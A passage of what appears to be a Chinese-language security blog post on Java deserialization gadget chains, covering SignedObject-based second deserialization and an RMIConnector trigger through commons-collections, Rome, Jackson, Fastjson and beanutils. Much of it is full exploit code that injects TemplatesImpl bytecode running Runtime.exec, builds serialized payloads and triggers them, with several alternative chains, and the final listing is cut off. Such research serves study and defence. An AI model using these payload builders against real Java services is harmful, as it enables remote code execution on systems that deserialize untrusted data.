class="code"><pre><code class="hljs java">    <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>    <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>    <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>    <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>    signature.initSign(privateKey);<br>    <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br>BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;();<br>    setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>);<br>    PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);<br><br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,objectBeanComparator);<br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>    Object[] objects = &#123;signedObject, <span class="hljs-number">1</span>&#125;;<br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br></code></pre></td></tr></table></figure><h3 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc5_Templateslmpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.TreeMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">signedobject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br><br><span class="hljs-comment">//        一、利用链：hashmap-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.EqualsBean.javabeanHashCode()-&gt;EqualsBean.toString()-&gt;jackson.databind.node.POJONode.toString()-&gt;com.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;templates.getOutputProperties()</span><br><span class="hljs-comment">//        POJONode jsonNodes = new POJONode(templates);</span><br><span class="hljs-comment">//        EqualsBean bean = new EqualsBean(String.class, &quot;22&quot;);</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap.put(bean,&quot;222&quot;);</span><br><span class="hljs-comment">//        setFieldValue(bean,&quot;_obj&quot;,jsonNodes);</span><br><br><span class="hljs-comment">//       二、利用链：HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;**com.alibaba.fastjson.JSONObject.toString()/com.alibaba.fastjson.JSONArray.toString()**-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com/alibaba/fastjson/serializer/JSONSerializer.java#write()-&gt;com/alibaba/fastjson/serializer/ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;templates.getOutputProperties()</span><br><span class="hljs-comment">//        JSONObject jsonObject = new JSONObject();</span><br><span class="hljs-comment">//        jsonObject.put(&quot;1&quot;,templates);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val, &quot;val&quot;, jsonObject);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap2.put(templates,val);</span><br><br><span class="hljs-comment">//        三、利用链：BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;templates.getOutputProperties()</span><br>      <br><span class="hljs-comment">//        删除 BaseJsonNode 的 writeReplace,使能写入序列化数据</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool_1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool_1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonNodes);<br><br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(val, privateKey,signature );<br><br><br><span class="hljs-comment">//        一、利用链：hashmap-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.ObjectBean.hashcode()-&gt;EqualsBean.javabeanHashCode()-&gt;oStringBean.java#toString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="hljs-comment">//        ObjectBean root = new ObjectBean(ToStringBean.class, toStringBean);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap1.put(root,&quot;x&quot;);</span><br><br><span class="hljs-comment">//        二、BadAttributeValueExpException.readObject()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, toStringBean);</span><br><br><span class="hljs-comment">//        三、BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        POJONode jsonNodes1 = new POJONode(signedObject);</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, jsonNodes1);</span><br><br><br><span class="hljs-comment">//        四、HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;**com.alibaba.fastjson.JSONObject.toString()/com.alibaba.fastjson.JSONArray.toString()**-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com/alibaba/fastjson/serializer/JSONSerializer.java#write()-&gt;com/alibaba/fastjson/serializer/ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;SignedObject.getObject()</span><br><span class="hljs-comment">////        JSONObject jsonObject = new JSONObject();</span><br><span class="hljs-comment">////        jsonObject.put(&quot;222&quot;,signedObject);</span><br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(signedObject);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, objects);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap1.put(signedObject,val1);</span><br><br><span class="hljs-comment">//        五、PriorityQueue.readObect()-&gt; org.apache.commons.beanutils.BeanComparator.compare()-&gt;PropertyUtils.getProperty()-&gt;SignedObject.getObject()-&gt;PropertyUtilsBean.java#getSimpleProperty()-&gt;SignedObject.getObject()</span><br>        BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;();<br>        setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>);<br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);<br><br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,objectBeanComparator);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        Object[] objects = &#123;signedObject, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">ser2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser2);<br>        oos.writeObject(priorityQueue);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser2&quot;</span>));<br>        ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01  分析"></a>0x01  分析</h3><p>javax.management.remote.rmi.RMIConnector#findRMIServerJRMP()</p><p><img src="image-20240118001634774.png" alt="image-20240118001634774"></p><p><img src="image-20240118001428885.png" alt="image-20240118001428885"></p><p>可以看到传入base64字节，然后转object流，然后序列化</p><p>往上跟</p><p>javax.management.remote.rmi.RMIConnector#findRMIServer()</p><p><img src="image-20240118001855185.png" alt="image-20240118001855185"></p><p>可以看到以“&#x2F;stub&#x2F;”开头就会调用findRMIServerJRMP()</p><p>javax.management.remote.rmi.RMIConnector#connect()</p><p><img src="image-20240118002403207.png" alt="image-20240118002403207"></p><p><img src="image-20240118002245659.png" alt="image-20240118002245659"></p><p>可以看见rmiServer等于空就回调用findRMIServer()</p><p>查看构造方法</p><p><img src="image-20240118002459279.png" alt="image-20240118002459279"></p><p><img src="image-20240118002515910.png" alt="image-20240118002515910"></p><p>可以看见构造方法符合条件。</p><p><img src="image-20240118002840672.png" alt="image-20240118002840672"></p><p>JMXServiceURL必须为service:jmx:开头。</p><p><img src="image-20240118003522640.png" alt="image-20240118003522640"></p><p>这里获取JMXServiceURL的URLPATH，然后URLPATH要以&#x2F;stub&#x2F;开头，截取第6位到末位的字符传入触发二次反序列化。</p><p>所以new一个JMXServiceURL对象，然后反射赋值就行。最后构造RMIConnector。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+serbase64);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-构造"><a href="#0x02-构造" class="headerlink" title="0x02 构造"></a>0x02 构造</h3><p>由于我们要出发connect()，它不是javabean，所以有很多限制，佬们想到的是cc的invoketransfrom来触发。</p><p>既然是cc触发，说实话，如大佬所说鸡肋。</p><p>cc链触发，很容易想到cc4.0用PriorityQueue，cc 3.2.1一下用lazymap.get()</p><h4 id="一、cc6前半"><a href="#一、cc6前半" class="headerlink" title="一、cc6前半"></a>一、cc6前半</h4><p>hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;tiedMapEntry.hashcode-&gt;tiedMapEntry.getValue-&gt;lazyMap.get()-&gt;invokerTransformer.Transformer()-&gt;rmiConnector.connect()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate( <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, rmiConnector);<br><br>HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xx&quot;</span>);<br>lazyMap.clear();<br>setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokerTransformer);<br></code></pre></td></tr></table></figure><h4 id="二、-cc4-0、PriorityQueue"><a href="#二、-cc4-0、PriorityQueue" class="headerlink" title="二、 cc4.0、PriorityQueue"></a>二、 cc4.0、PriorityQueue</h4><p>PriorityQueue.readObject()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.comparator()-&gt;InvokerTransformer.transformer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br><br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>Object[] objects = &#123;rmiConnector, <span class="hljs-number">1</span>&#125;;<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,comparator);<br></code></pre></td></tr></table></figure><h4 id="三、-cc3-2-1-cc4-动态代理"><a href="#三、-cc3-2-1-cc4-动态代理" class="headerlink" title="三、 cc3.2.1 cc4  动态代理"></a>三、 cc3.2.1 cc4  动态代理</h4><p>AnnotationInvocationHandler.readObject-&gt;AnnotationInvocationHandler.invoke-&gt;DefaultedMap.get()-&gt;transformerChain.transformer()-&gt;InvokerTransformer.transformer()-&gt;rmiConnector.connect()</p><p>CC4 没有lazymap了， 改用defaultedMap即可。cc1都可以用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>DefaultedMap&lt;Object, Optional&lt;ConstantTransformer&gt;&gt; defaultedMap =<br>        DefaultedMap.defaultedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)));<br>setFieldValue(defaultedMap,<span class="hljs-string">&quot;value&quot;</span>, transformerChain);<br><br>Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared =<br>        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, defaultedMap);<br><span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Anotationdeclared.newInstance(Override.class,Mapproxy);<br></code></pre></td></tr></table></figure><h3 id="0x03-完整exp-1"><a href="#0x03-完整exp-1" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 